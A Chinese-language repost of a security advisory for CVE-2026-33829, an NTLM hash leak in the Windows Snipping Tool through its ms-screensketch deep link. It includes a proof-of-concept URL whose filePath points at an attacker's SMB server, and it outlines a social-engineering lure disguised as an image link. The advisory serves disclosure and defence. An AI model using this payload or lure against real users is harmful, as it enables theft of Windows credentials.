#  【视频】一键式 NTLM 泄露漏洞  
 黑白之道   2026-04-16 00:42  
  
利用截图工具应用程序进行 NTLM 泄露。  
## 概括此漏洞允许远程攻击者泄露受影响版本的截图工具应用程序用户的 NTLM 响应。利用此漏洞需要用户交互，即目标用户必须访问恶意页面或打开一个链接，该链接将通过 URI 架构触发截图工具应用程序ms-screensketch。  
  
##   
## 描述  
  
  
**受影响的截图工具**版本会注册一个深度链接，该链接ms-screensketch指向的架构的参数filePath可用于强制建立与任意服务器的已验证 SMB 连接，从而泄露用户的 Net-NTLM 哈希值。  
```
<Extensions>    <uap:Extension Category="windows.protocol">        <uap:Protocol Name="ms-screensketch" DesiredView="default"/>    </uap:Extension>    ...
```  
  
  
该问题源于在触发 SMB 连接之前，URL 输入验证不足。攻击者可以利用此漏洞泄露当前用户的 NTLM 响应。  
## 概念验证  
  
1. 设置 SMB 监听器  
1. 在浏览器中打开以下指向您自己的 SMB 服务器地址的 URL  
```
ms-screensketch:edit?&filePath=\\snip.blackarrow.lab\file.png&isTemporary=false&saved=true&source=Toast
```  
  
  
## 攻击场景  
  
  
由于**截图工具**实际上会打开远程资源，因此该漏洞很容易被利用，从而引发逼真的社会工程攻击（例如，要求用户在本地裁剪或编辑图片，例如新的公司壁纸、徽章照片等）。  
  
为了增加可信度，攻击者可以托管一个类似于直接图像链接的 URL，例如https://snip.example.com/wallpaper/image.png，该 URL 实际上会提供一个 HTML 页面，该页面会自动触发深度链接。  
  
用户会看到截图工具打开，这与之前的伪装一致，而 NTLM 身份验证则在后台透明地进行。  
## 推荐  
  
  
安装微软于 2026 年 4 月 14 日发布的安全更新中的安全补丁。  
## 披露时间表  
  
- 2026年3月23日 - 已向供应商报告漏洞  
- 2026-04-14 - 供应商发布修复程序  
- 2026年4月14日 - 协调发布公告  
## 参考  
  
- CVE-2026-33829  
  
文章内容与视频来源：  
https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2026-33829  
  
  
